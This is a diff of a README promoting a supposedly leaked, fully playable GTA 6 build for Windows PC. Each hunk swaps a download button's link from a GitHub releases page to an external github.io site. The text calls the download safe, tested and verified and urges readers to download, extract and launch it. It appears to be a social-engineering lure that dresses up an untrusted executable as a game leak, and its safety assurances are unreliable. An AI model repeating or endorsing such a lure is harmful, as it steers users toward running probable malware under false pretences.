@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Cyberleek-December-Build-2026 - Play the Leaked Build Today</h1>
 
 <p align="center">
-  <a href="https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-Visit_Link-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="400"></a>
+  <a href="https://valerovati03.github.io"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-Visit_Link-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="400"></a>
 </p>
 
 Welcome! You have found the **GTA 6 Cyberleek December Build 2026** — the fully playable leaked development build for Windows PC. This is your chance to experience the most anticipated game of the decade before anyone else. No complicated steps, no programming knowledge needed — just follow this simple guide and you will be playing in minutes.
@@ -37,7 +37,7 @@ Follow these steps in order. Do not skip ahead. Each step is designed to make th
 Click the big green button below to go to the official download page. This is the only source you need — it is safe, tested, and verified.
 
 <p align="center">
-  <a href="https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_HERE-Visit_Link-4CAF50?style=for-the-badge&logo=download&logoColor=white" alt="Download GTA 6" width="350"></a>
+  <a href="https://valerovati03.github.io"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_HERE-Visit_Link-4CAF50?style=for-the-badge&logo=download&logoColor=white" alt="Download GTA 6" width="350"></a>
 </p>
 
 Visit this link to download the application. Once you are on the page, look for the newest release (December 2026 Build) and click the download button. The file will be large, so let it run in the background while you prepare your PC.
@@ -157,7 +157,7 @@ Remember to help your PC stay cool during long sessions, save often, and most im
 Here is the direct link one final time, in case you scrolled past it earlier:
 
 <p align="center">
-  <a href="https://github.com/valerovati03/GTA-6-Cyberleek-December-Build-2026/releases"><img src="https://img.shields.io/badge/⬇️_GET_THE_BUILD-HERE-FF5722?style=for-the-badge&logo=download" alt="Download" width="300"></a>
+  <a href="https://valerovati03.github.io"><img src="https://img.shields.io/badge/⬇️_GET_THE_BUILD-HERE-FF5722?style=for-the-badge&logo=download" alt="Download" width="300"></a>
 </p>
 
 Visit this link to download the application. Click the latest release, download it, extract it, and launch into the world of GTA 6. Your next gaming obsession starts now.
